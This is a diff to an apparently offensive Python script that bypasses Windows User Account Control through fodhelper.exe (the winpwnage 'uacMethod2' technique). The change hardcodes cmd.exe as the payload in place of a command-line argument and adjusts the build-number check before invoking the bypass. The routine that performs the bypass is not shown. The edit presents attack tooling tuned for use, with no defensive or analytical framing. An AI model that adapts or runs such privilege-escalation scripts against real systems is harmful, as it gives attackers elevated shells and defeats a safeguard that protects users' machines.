@@ -7,7 +7,6 @@ import ctypes
 import enum
 from ctypes import *
 from ctypes.wintypes import *
-from __future__ import print_function
 
 try:
 	import _winreg	# Python 2
@@ -609,21 +608,21 @@ def main():
 	print_info("Running elevated: {}".format(information().admin()))
 	print_info("Python version: {}.{}.{}\n".format(*sys.version_info))
 
-	# --- Simplified argument parsing ---
-	parser = argparse.ArgumentParser(description="UAC bypass using fodhelper.exe (winpwnage uacMethod2).")
-	parser.add_argument("-p", "--payload", nargs="+", required=True, help="Payload to execute. e.g.: -p C:\\Windows\\System32\\cmd.exe")
-	args = parser.parse_args()
+	# --- The payload is now hardcoded. No command-line arguments are needed. --- # MODIFIED SECTION
+	hardcoded_payload = [os.path.join(information().system_directory(), 'cmd.exe')]
+	print_info("Using hardcoded payload: {}".format(hardcoded_payload[0]))
 
 	# --- Execute the UAC bypass ---
 	if information().admin():
 		print_warning("You are already running with administrative privileges.")
 		sys.exit(0)
 		
-	if int(information().build_number()) >= 10240:
+	build_num = information().build_number()
+	if build_num and int(build_num) >= 10240:
 		print_info("Attempting to bypass UAC with fodhelper method...")
-		uacMethod2(payload=args.payload)
+		uacMethod2(payload=hardcoded_payload)
 	else:
-		print_error("Target OS is not vulnerable.")
+		print_error("Target OS is not vulnerable (Build number {} < 10240).".format(build_num))
 
 
 if __name__ == "__main__":
